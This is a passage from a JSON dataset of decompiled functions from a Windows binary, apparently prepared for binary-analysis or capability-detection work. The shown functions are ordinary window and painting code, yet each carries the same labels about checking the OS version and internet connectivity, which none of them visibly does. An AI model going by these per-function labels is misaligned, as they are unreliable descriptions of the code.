        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043d57c(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x43d587;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x43d59a;\n    var_5h._0_1_ = extraout_DL;\n    fcn.004453b0();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x43d5af;\n        (**(***0x4927a0 + 0x14))();\n    }\n    uStack20 = 0x43d67c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.00440f40();\n    cVar1 = fcn.00458874();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.00443e1c();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.0040f934();\n    fcn.0040f934();\n    fcn.00447dac();\n    fcn.00404650();\n    fcn.00402f1c();\n    fcn.0043c9a8();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43d683;\n    uStack20 = 0x43d67b;\n    (**(***0x4927a0 + 0x18))();\n    return;\n}\n",
        "token_count": 469
    },
    "0043d698": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d698(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x43d6d9;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x43d70e;\n        fcn.0043e37c();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "0043d714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d714(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x43d755;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0043d774": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d774(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00452f28();\n    if ((*(in_EAX + 0x268) != 0) && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        *(in_EAX + 0x268) = 0;\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') {\n            fcn.00440a40();\n        }\n    }\n    fcn.00447dac();\n    cVar1 = fcn.00448098();\n    if (cVar1 != '\\0') {\n        fcn.00447e60();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0043d914": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d914(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x43d927;\n    fcn.00454174();\n    uStack24 = 0x43db91;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004045dc();\n    if (iVar2 == *0x43a258) {\n        *(in_EAX + 0x27c) = *0x4957f5 ^ 1;\n    }\n    fcn.0045379c();\n    if ((**(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (**(in_EAX + 0x2a4) != *(*0x497c20 + 0x40))) {\n            uVar3 = fcn.0042491c(*(*0x497c20 + 0x40), **(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00424924();\n        }\n        **(in_EAX + 0x2a4) = *(*0x497c20 + 0x40);\n        iVar2 = fcn.0043df48();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.0043ce70();\n            fcn.004502c0();\n            fcn.00458020();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.00450198();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.004501dc();\n    }\n    *(in_EAX + 0x8c) = *0x43dba0;\n    if (!bVar1) {\n        fcn.0043ce70();\n        fcn.00458020();\n    }\n    uVar3 = 0;\n    fcn.00451abc(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.0045417c(0x43db98);\n    return;\n}\n",
        "token_count": 897
    },
    "0043dba4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dba4(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    // switch table (6 cases) at 0x43dbba\n    switch(in_EAX & 0x7f) {\n    case 0:\n        uVar1 = fcn.00447dac();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0xc) != 0;\n    case 1:\n        uVar1 = fcn.00447dac();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x10) != 0;\n    case 2:\n        uVar1 = fcn.00447dac();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x14) != 0;\n    case 3:\n        uVar1 = fcn.00447dac();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x18) != 0;\n    case 4:\n        iVar2 = fcn.00447dac();\n        return *(iVar2 + 8);\n    case 5:\n        iVar2 = fcn.00447dac();\n        return *(iVar2 + 0x28);\n    default:\n        return 0;\n    }\n}\n",
        "token_count": 303
    },
    "0043df0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043df0c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 97
    },
    "0043df2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043df2c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 91
    },
    "0043dff8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043dff8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x4924c8 == '\\0') {\n        fcn.00458568();\n        iVar3 = fcn.0043b6cc();\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    else {\n        cVar1 = fcn.00458874();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x271) != '\\x03')) {\n            uVar2 = fcn.004410b4();\n            uVar2 = fcn.00458568(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0043e064": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043e064(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 600) == '\\0') && (*(*(in_EAX + 0x250) + 0x10) == 0)) && (*(*(in_EAX + 0x254) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 94
    },
    "0043e3c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e3c0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x43e4a6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x277) == '\\x01') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x57) != '\\0')) &&\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x30) == 0)) {\n        fcn.00407550();\n        fcn.0040daec();\n        fcn.00404ec4();\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    if ((in_EAX == *(*0x497c1c + 0x44)) && ((*(in_EAX + 0x1c) & 8) == 0)) {\n        if (*(in_EAX + 0x57) == '\\0') {\n            fcn.0044818c();\n            fcn.0043b748();\n            uVar3 = fcn.0044818c();\n            fcn.00458568(uVar3);\n            fcn.0043b748();\n        }\n        else {\n            uVar2 = fcn.0044818c();\n            fcn.00458568(uVar2 ^ 1);\n            fcn.0043b748();\n            fcn.0043b748();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43e4ad;\n    uStack20 = 0x43e4a5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 469
    },
    "0043e4b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e4b8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x43e4f1;\n            fcn.00459908();\n        }\n        uStack24 = 0x43e568;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.004599d0();\n        if (in_EAX[0xc] == 0) {\n            fcn.00455128();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x43e56f;\n        if (bVar1) {\n            uStack24 = 0x43e567;\n            fcn.00459908();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "0043e574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e574(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004203cc(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0043e5b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e5b4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *param_2;\n    if (iVar6 < 0x113) {\n        if (iVar6 == 0x112) {\n            if ((((param_2[1] & 0xfff0U) == 0xf120) && (*(*0x497c1c + 0x44) == in_EAX)) &&\n               (cVar1 = fcn.0044818c(),  cVar1 != '\\0')) {\n                fcn.00448194();\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 - 6U < 3) {\n            if (*0x490508 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar6 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar2 = fcn.0043f464();\n                    if (iVar2 != 0) {\n                        fcn.0043f464();\n                        iVar6 = fcn.00458568();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar6 = fcn.00458568();\n                }\n                if (iVar6 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0x2b) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (iVar6 = fcn.00437994(),  iVar6 != 0)) {\n                fcn.00425088();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.0042571c();\n                fcn.004255b0();\n                piVar3 = *(piVar3 + 4);\n                puStack72 = 0x43e8ec;\n                fcn.0043911c(piVar3);\n                *in_FS_OFFSET = piVar3;\n                fcn.0042571c();\n                puStack72 = 0x43e913;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0x2c) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (piVar4 = fcn.00437994(),  piVar4 != NULL)) {\n                fcn.00458568();\n                uVar5 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.00425088();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x43e9b6;\n                iVar6 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x43ea1b;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.0042571c();\n                fcn.004255b0();\n                piVar3 = piVar3 + 4;\n                (**(*piVar4 + 0x38))();\n                *in_FS_OFFSET = piVar3;\n                uStack76 = 0x43ea22;\n                piStack80 = 0x43ea0d;\n                fcn.0042571c();\n                piStack80 = iVar6;\n                sub.gdi32.dll_RestoreDC(uVar5);\n                return;\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0x46) {\n            if (*0x43eaf8 == (*(in_EAX + 7) & *0x43eaf4)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x0043eae0;\n        }\n    }\n    else {\n        if (iVar6 - 0x31eU < 2) {\n            fcn.00447e60();\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eae0;\n        }\n        if (iVar6 == 0xb047) {\n            iVar6 = param_2[1];\n            iVar2 = 0;\n            while ((iVar6 != 0 && (iVar2 == 0))) {\n                iVar2 = fcn.0044d264();\n                iVar6 = sub.user32.dll_GetParent();\n            }\n            if ((iVar2 != 0) &&\n               ((((piVar3 = fcn.0043bd00(),  iVar2 != in_EAX[0x9a] || (iVar2 != *(*0x497c20 + 100))) && (piVar3 != NULL)\n                 ) && ((piVar3 == in_EAX || (piVar3 != *(*0x497c20 + 0x68))))))) {\n                if ((piVar3[0x9a] != 0) && (iVar2 != piVar3[0x9a])) {\n                    fcn.00451abc(0);\n                }\n                (**(*piVar3 + 0xf8))();\n            }\n            goto code_r0x0043eae0;\n        }\n    }\n    if (iVar6 == *0x497c28) {\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n    }\ncode_r0x0043eae0:\n    fcn.00455664();\n    return;\n}\n",
        "token_count": 1762
    },
    "0043eb88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043eb88(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00424f6c();\n            puStack128 = 0x43ebf6;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.0043eb88::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x43ec06;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.0043eb88::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00424f6c();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.0043eb88::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x43ec65;\n            fcn.0043eafc(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.0043f498();\n                if (iVar2 != 0) {\n                    puStack128 = 0x43ec88;\n                    fcn.0043eb48(&stack0xfffffffc);\n                }\n                fcn.0043b6fc();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x43ebbf;\n            fcn.0043eafc(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x43ed63;\n            fcn.0043eafc(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x43ecc8;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x43ed56;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.0043eb88::var_5ch);\n        fcn.00450344();\n        fcn.0044ee10();\n    }\n    fcn.00455cc0();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x43ed64;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.0043eb88::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 951
    },
    "0043ee6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ee6c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x43eeec;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "0043f114": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0043f114(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x43f162\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x4924c8 == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 546
    },
    "0043f228": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f228(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x43f266;\n        fcn.0043cbb0();\n        uStack24 = 0x43f26d;\n        cVar1 = fcn.00458874();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x43f298;\n            uStack28 = fcn.00458568();\n            uStack32 = 0x43f29e;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x43f2aa;\n            uStack36 = fcn.00458568();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.00458568(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.0040484c(puVar4);\n            fcn.0040484c();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.00458568(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00458568(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00458568(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            cVar1 = fcn.00458874();\n            if (cVar1 != '\\0') {\n                if (**0x4924c8 != '\\0') {\n                    if (*(in_EAX + 0x271) == '\\x03') {\n                        uVar2 = fcn.00458568(0x80, 1, 0);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                    else {\n                        uVar2 = fcn.004410b4();\n                        uVar2 = fcn.00458568(0x80, 1, uVar2);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                }\n                uVar2 = fcn.00458568(0xffffffff);\n                sub.user32.dll_GetSystemMenu(uVar2);\n                fcn.00451abc(0);\n            }\n            uVar2 = fcn.00458568(0, 0, 0, 0, 0, 0x37);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 765
    },
    "0043f464": {
        "rules": [
